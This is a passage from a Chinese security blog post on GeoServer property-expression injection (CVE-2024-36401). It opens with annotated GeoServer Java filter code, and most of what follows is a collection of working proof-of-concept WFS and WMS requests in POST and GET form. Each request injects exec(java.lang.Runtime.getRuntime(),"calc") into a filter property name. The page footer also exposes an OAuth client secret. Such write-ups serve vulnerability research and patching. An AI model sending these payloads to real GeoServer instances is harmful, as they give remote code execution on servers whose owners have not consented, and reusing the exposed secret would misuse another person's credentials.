    <span class="token comment">// 使用访问器访问过滤器</span>
    filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>fvisitor<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 3. 确保查询中指定的任何边界都相对于查询上定义的srs是有效的</span>
    <span class="token comment">// 如果wfs是CiteCompliant</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>wfs<span class="token punctuation">.</span><span class="token function">isCiteCompliant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// 如果查询的srsName不为空</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span><span class="token function">getSrsName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">final</span> <span class="token class-name">Query</span> fquery <span class="token operator">=</span> query<span class="token punctuation">;</span>
            <span class="token comment">// 创建一个CiteBBOXValidator对象</span>
            fvisitor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CiteBBOXValidator</span><span class="token punctuation">(</span>fquery<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 使用访问器访问过滤器</span>
            filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>fvisitor<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 4. 确保在非空间比较中不使用空间属性 (CITE WFS 2.0)</span>
    <span class="token comment">// 如果wfs是CiteCompliant</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>wfs<span class="token punctuation">.</span><span class="token function">isCiteCompliant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个过滤器访问器</span>
        fvisitor <span class="token operator">=</span>
                <span class="token keyword">new</span> <span class="token class-name">AbstractFilterVisitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 重写visit方法</span>
                    <span class="token annotation punctuation">@Override</span>
                    <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">BinaryComparisonOperator</span> filter<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token class-name">Expression</span> ex1 <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">getExpression1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">Expression</span> ex2 <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">getExpression2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token comment">// 如果第一个表达式是属性名</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ex1 <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token function">checkNonSpatial</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> ex1<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token comment">// 如果第二个表达式是属性名</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ex2 <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token function">checkNonSpatial</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> ex2<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>filter<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token comment">// 定义一个检查非空间的方法</span>
                    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">checkNonSpatial</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token class-name">AttributeDescriptor</span> ad <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">AttributeDescriptor</span><span class="token punctuation">)</span> pn<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>featureType<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token comment">// 如果属性描述符是一个几何描述符或者是GmlBoundedBy</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ad <span class="token keyword">instanceof</span> <span class="token class-name">GeometryDescriptor</span> <span class="token operator">||</span> <span class="token function">isGmlBoundedBy</span><span class="token punctuation">(</span>pn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token comment">// 抛出一个WFSException异常，异常信息为"不能在字母数字二进制比较中使用空间属性"</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WFSException</span><span class="token punctuation">(</span>
                                    request<span class="token punctuation">,</span>
                                    <span class="token string">"Cannot use a spatial property in a alphanumeric binary "</span>
                                            <span class="token operator">+</span> <span class="token string">"comparison"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token comment">// 使用访问器访问过滤器</span>
        filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>fvisitor<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<pre class="language-java" data-language="java"><code class="language-java">
<span class="token operator">/</span>geoserver<span class="token operator">/</span>wms<span class="token operator">?</span>version<span class="token operator">=</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token operator">&amp;</span>bbox<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">66</span><span class="token operator">&amp;</span><span class="token class-name">Format</span><span class="token operator">=</span>image<span class="token operator">/</span>png<span class="token operator">&amp;</span>request<span class="token operator">=</span><span class="token class-name">GetMap</span><span class="token operator">&amp;</span>width<span class="token operator">=</span><span class="token number">550</span><span class="token operator">&amp;</span>height<span class="token operator">=</span><span class="token number">250</span><span class="token operator">&amp;</span>crs<span class="token operator">=</span><span class="token constant">EPSG</span><span class="token operator">:</span><span class="token number">4326</span><span class="token operator">&amp;</span><span class="token constant">SLD_BODY</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">3</span>CStyledLayerDescriptor<span class="token operator">+</span>version<span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">221.1</span><span class="token number">.0</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CUserLayer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CName<span class="token operator">%</span><span class="token number">3</span>Etopp<span class="token operator">%</span><span class="token number">3</span>Astates<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Name<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CUserStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CName<span class="token operator">%</span><span class="token number">3</span>EUserSelection<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Name<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CFeatureTypeStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CRule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CFilter<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CPropertyIsEqualTo<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CPropertyName<span class="token operator">%</span><span class="token number">3</span>Eexec<span class="token operator">%</span><span class="token number">28</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">2</span>C<span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>PropertyName<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CLiteral<span class="token operator">%</span><span class="token number">3</span>EIllinois<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Literal<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>PropertyIsEqualTo<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Filter<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CPolygonSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CFill<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CSvgParameter<span class="token operator">+</span>name<span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">22f</span>ill<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">23F</span><span class="token constant">F0000</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>SvgParameter<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Fill<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>PolygonSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Rule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CRule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CLineSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CStroke<span class="token operator">%</span><span class="token number">2F</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>LineSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Rule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>FeatureTypeStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>UserStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>UserLayer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>StyledLayerDescriptor<span class="token operator">%</span><span class="token number">3</span>E </code></pre>
<img src="/img/24-7-8/19.png">
跟上面的一样是从evalute走入的
## 其他Poc
### BBOX-1.0
<pre class="language-none"><code class="language-none">post:
&lt;wfs:GetFeature service="WFS" version="1.0.0"
  xmlns:topp="http://www.openplans.org/topp"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc"
  xmlns:gml="http://www.opengis.net/gml"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;
  &lt;wfs:Query typeName="topp:states"&gt;
    &lt;ogc:Filter&gt;
      &lt;ogc:BBOX&gt;
        &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;
        &lt;gml:Box srsName="http://www.opengis.net/gml/srs/epsg.xml#4326"&gt;
           &lt;gml:coordinates&gt;-75.102613,40.212597 -72.361859,41.512517&lt;/gml:coordinates&gt;
        &lt;/gml:Box&gt;
      &lt;/ogc:BBOX&gt;
   &lt;/ogc:Filter&gt;
  &lt;/wfs:Query&gt;
&lt;/wfs:GetFeature&gt;</code></pre>
### BBOX-1.1
<pre class="language-none"><code class="language-none">post:
&lt;wfs:GetFeature service="WFS" version="1.1.0"
  xmlns:topp="http://www.openplans.org/topp"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc"
  xmlns:gml="http://www.opengis.net/gml"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;
  &lt;wfs:Query typeName="topp:states"&gt;
    &lt;ogc:Filter&gt;
      &lt;ogc:BBOX&gt;
        &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;
        &lt;gml:Envelope srsName="http://www.opengis.net/gml/srs/epsg.xml#4326"&gt;
           &lt;gml:lowerCorner&gt;-75.102613 40.212597&lt;/gml:lowerCorner&gt;
           &lt;gml:upperCorner&gt;-72.361859 41.512517&lt;/gml:upperCorner&gt;
        &lt;/gml:Envelope&gt;
      &lt;/ogc:BBOX&gt;
   &lt;/ogc:Filter&gt;
  &lt;/wfs:Query&gt;
&lt;/wfs:GetFeature&gt;</code></pre>
### Between-1.0/1.1
<pre class="language-none"><code class="language-none">&lt;wfs:GetFeature service="WFS" version="1.0.0"
  xmlns:topp="http://www.openplans.org/topp"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc"
  xmlns:gml="http://www.opengis.net/gml"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;
  &lt;wfs:Query typeName="topp:states"&gt;
&lt;ogc:Filter&gt;
&lt;ogc:PropertyIsBetween&gt;
&lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;
&lt;ogc:LowerBoundary&gt;&lt;ogc:Literal&gt;100000&lt;/ogc:Literal&gt;&lt;/ogc:LowerBoundary&gt;
&lt;ogc:UpperBoundary&gt;&lt;ogc:Literal&gt;150000&lt;/ogc:Literal&gt;&lt;/ogc:UpperBoundary&gt;
&lt;/ogc:PropertyIsBetween&gt;
&lt;/ogc:Filter&gt;
  &lt;/wfs:Query&gt;
&lt;/wfs:GetFeature&gt; 

GET:
/geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;propertyName=STATE_NAME,LAND_KM,the_geom&amp;outputFormat=GML2&amp;FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%3E%3CPropertyIsBetween%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLowerBoundary%3E%3CLiteral%3E100000%3C%2FLiteral%3E%3C%2FLowerBoundary%3E%3CUpperBoundary%3E%3CLiteral%3E150000%3C%2FLiteral%3E%3C%2FUpperBoundary%3E%3C%2FPropertyIsBetween%3E%3C%2FFilter%3E</code></pre>
### Intersects-1.0/1.1
<pre class="language-none"><code class="language-none">POST:
&lt;wfs:GetFeature service="WFS" version="1.0.0"
  xmlns:topp="http://www.openplans.org/topp"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns="http://www.opengis.net/ogc"
  xmlns:gml="http://www.opengis.net/gml"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;
  &lt;wfs:Query typeName="topp:states"&gt;
    &lt;Filter&gt;
      &lt;Intersects&gt;
        &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/PropertyName&gt;
        &lt;/Intersects&gt;
      &lt;/Filter&gt;
  &lt;/wfs:Query&gt;
&lt;/wfs:GetFeature&gt;

GET:
/geoserver/wfs?request=GetFeature&amp;version=1.0.0&amp;typeName=topp:states&amp;FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%3E%3CIntersects%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3Cgml%3APoint+srsName%3D%22EPSG%3A4326%22%3E%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%3C%2Fgml%3APoint%3E%3C%2FIntersects%3E%3C%2FFilter%3E</code></pre>
### NotDisjoint
<pre class="language-none"><code class="language-none">POST:
&lt;wfs:GetFeature service="WFS" version="2.0.0"
    xmlns:wfs="http://www.opengis.net/wfs/2.0" xmlns:fes="http://www.opengis.net/fes/2.0"
    xmlns:gml="http://www.opengis.net/gml/3.2" xmlns:sf="http://www.openplans.org/spearfish"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.opengis.net/wfs/2.0 http://schemas.opengis.net/wfs/2.0/wfs.xsd
        http://www.opengis.net/gml/3.2 http://schemas.opengis.net/gml/3.2.1/gml.xsd"&gt;
    &lt;wfs:Query typeNames="sf:bugsites"&gt;
        &lt;fes:Filter&gt;
            &lt;fes:Not&gt;
                &lt;fes:Disjoint&gt;
                    &lt;fes:ValueReference&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/fes:ValueReference&gt;
                &lt;/fes:Disjoint&gt;
            &lt;/fes:Not&gt;
        &lt;/fes:Filter&gt;
    &lt;/wfs:Query&gt;
&lt;/wfs:GetFeature&gt;

GET:
/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetFeature&amp;typenames=sf:bugsites&amp;filter=%3Cfes%3AFilter+xmlns%3Afes%3D%22http%3A%2F%2Fwww.opengis.net%2Ffes%2F2.0%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2F3.2%22%3E%3Cfes%3ANot%3E%3Cfes%3ADisjoint%3E%3Cfes%3AValueReference%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2Ffes%3AValueReference%3E%3Cgml%3APolygon+gml%3Aid%3D%27polygon.1%27+srsName%3D%27http%3A%2F%2Fwww.opengis.net%2Fdef%2Fcrs%2FEPSG%2F0%2F26713%27%3E%3Cgml%3Aexterior%3E%3Cgml%3ALinearRing%3E%3Cgml%3AposList%3E590431+4915204+590430+4915205+590429+4915204+590430+4915203+590431+4915204%3C%2Fgml%3AposList%3E%3C%2Fgml%3ALinearRing%3E%3C%2Fgml%3Aexterior%3E%3C%2Fgml%3APolygon%3E%3C%2Ffes%3ADisjoint%3E%3C%2Ffes%3ANot%3E%3C%2Ffes%3AFilter%3E</code></pre>
### Math
<pre class="language-none"><code class="language-none">POST：
&lt;wfs:GetFeature service="WFS" version="1.0.0"
  xmlns:topp="http://www.openplans.org/topp"
  xmlns:wfs="http://www.opengis.net/wfs"
  xmlns:ogc="http://www.opengis.net/ogc"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;
  &lt;wfs:Query typeName="topp:states"&gt;
    &lt;ogc:Filter&gt;
      &lt;ogc:PropertyIsGreaterThan&gt;
        &lt;ogc:Div&gt;
            &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;
            &lt;ogc:PropertyName&gt;xxx&lt;/ogc:PropertyName&gt;
        &lt;/ogc:Div&gt;
         &lt;ogc:Literal&gt;0.25&lt;/ogc:Literal&gt;
    &lt;/ogc:PropertyIsGreaterThan&gt;
    &lt;/ogc:Filter&gt;
    &lt;/wfs:Query&gt;
&lt;/wfs:GetFeature&gt;

GET：
/geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;formatName=GML2&amp;FILTER=%3Cogc:Filter%20xmlns:ogc=%22http://www.opengis.net/ogc%22%3E%3Cogc:PropertyIsGreaterThan%3E%3Cogc:Div%3E%3Cogc:PropertyName%3EMANUAL%3C/ogc:PropertyName%3E%3Cogc:PropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C/ogc:PropertyName%3E%3C/ogc:Div%3E%3Cogc:Literal%3E0.25%3C/ogc:Literal%3E%3C/ogc:PropertyIsGreaterThan%3E%3C/ogc:Filter%3E</code></pre>
## WMS getMap
<pre class="language-none"><code class="language-none">GET /geoserver/wms?version=1.3.0&amp;bbox=24,-130,50,-66&amp;Format=image/png&amp;request=GetMap&amp;width=550&amp;height=250&amp;crs=EPSG:4326&amp;SLD_BODY=%3CStyledLayerDescriptor+version%3D%221.1.0%22%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%3D%22fill%22%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%2F%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E HTTP/1.1
Host: 127.0.0.1:8085</code></pre>
<pre class="language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;ogc:GetMap xmlns:ogc="http://www.opengis.net/ows" 
            xmlns:gml="http://www.opengis.net/gml" 
            version="1.2.0"
            service="WMS"&gt;

  &lt;StyledLayerDescriptor version="1.0.0" 
                         xsi:schemaLocation="http://www.opengis.net/sld StyledLayerDescriptor.xsd"
                         xmlns="http://www.opengis.net/sld" 
                         xmlns:ogc="http://www.opengis.net/ogc" 
                         xmlns:xlink="http://www.w3.org/1999/xlink"
                         xmlns:dave="http://blasby.com" 
                         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
    &lt;UserLayer&gt;
      &lt;Name&gt;Inline&lt;/Name&gt;

      &lt;InlineFeature&gt;
        &lt;FeatureCollection&gt;
          &lt;featureMember&gt;
            &lt;BodyPart&gt;
              &lt;Type&gt;Mouth&lt;/Type&gt;
              &lt;polygonProperty&gt;
                &lt;gml:Polygon&gt;
                  &lt;gml:outerBoundaryIs&gt;
                    &lt;gml:LinearRing&gt;
                      &lt;gml:coordinates&gt;
                        397,226 396,209 396,196 390,185 384,175 368,163 353,155 331,150 308,149 283,148 261,153 231,163
                        209,175 195,189 186,209 182,221 187,226 193,214 195,205 200,197 203,192 215,185 226,177 241,171
                        256,167 266,163 281,161 297,161 321,160 341,160 359,168 371,175 382,185 388,197 390,215 390,225
                        394,226 397,226
                      &lt;/gml:coordinates&gt;
                    &lt;/gml:LinearRing&gt;
                  &lt;/gml:outerBoundaryIs&gt;
                &lt;/gml:Polygon&gt;
              &lt;/polygonProperty&gt;
            &lt;/BodyPart&gt;
          &lt;/featureMember&gt;
        &lt;/FeatureCollection&gt;
      &lt;/InlineFeature&gt;

      &lt;UserStyle&gt;
        &lt;FeatureTypeStyle&gt;
          &lt;Rule&gt;
            &lt;Filter&gt;
              &lt;Or&gt;
                &lt;PropertyIsEqualTo&gt;
                  &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/PropertyName&gt;
                  &lt;Literal&gt;Eye&lt;/Literal&gt;
                &lt;/PropertyIsEqualTo&gt;
              &lt;/Or&gt;
            &lt;/Filter&gt;
            &lt;PolygonSymbolizer&gt;
              &lt;Fill&gt;
                &lt;CssParameter name="fill"&gt;
                  &lt;ogc:Literal&gt;#DD06E0&lt;/ogc:Literal&gt;
                &lt;/CssParameter&gt;
                &lt;CssParameter name="fill-opacity"&gt;
                  &lt;ogc:Literal&gt;1.0&lt;/ogc:Literal&gt;
                &lt;/CssParameter&gt;
              &lt;/Fill&gt;
              &lt;Stroke&gt;
                &lt;CssParameter name="stroke"&gt;
                  &lt;ogc:Literal&gt;#FF00FF&lt;/ogc:Literal&gt;
                &lt;/CssParameter&gt;
              &lt;/Stroke&gt;
            &lt;/PolygonSymbolizer&gt;
          &lt;/Rule&gt;
        &lt;/FeatureTypeStyle&gt;
      &lt;/UserStyle&gt;
    &lt;/UserLayer&gt;

  &lt;/StyledLayerDescriptor&gt;

  &lt;BoundingBox&gt;
    &lt;gml:coord&gt;
      &lt;gml:X&gt;0&lt;/gml:X&gt;
      &lt;gml:Y&gt;0&lt;/gml:Y&gt;
    &lt;/gml:coord&gt;
    &lt;gml:coord&gt;
      &lt;gml:X&gt;500&lt;/gml:X&gt;
      &lt;gml:Y&gt;500&lt;/gml:Y&gt;
    &lt;/gml:coord&gt;
  &lt;/BoundingBox&gt;

  &lt;Output&gt;
    &lt;Format&gt;image/jpeg&lt;/Format&gt;
    &lt;Transparent&gt;false&lt;/Transparent&gt;
    &lt;Size&gt;
      &lt;Width&gt;501&lt;/Width&gt;
      &lt;Height&gt;501&lt;/Height&gt;
    &lt;/Size&gt;
  &lt;/Output&gt;


&lt;/ogc:GetMap&gt;</code></pre>
## Reference

<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></li>
<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/">https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/</a></li>
</ul>

                
            </div>
            <hr/>

            



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/java%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">java安全</span>
                                </a>
                            
                                <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
                                    <span class="chip bg-color">表达式注入</span>
                                </a>
                            
                                <a href="/tags/geoserver/">
                                    <span class="chip bg-color">geoserver</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,wechat,weibo,twitter,facebook" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '0efb4a442bc09d1ba17e',
        clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
        repo: 'yyjccc.github.io',
        owner: 'Yyjccc',
        admin: "Yyjccc",
        id: '2024-07-08T14-41-41',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
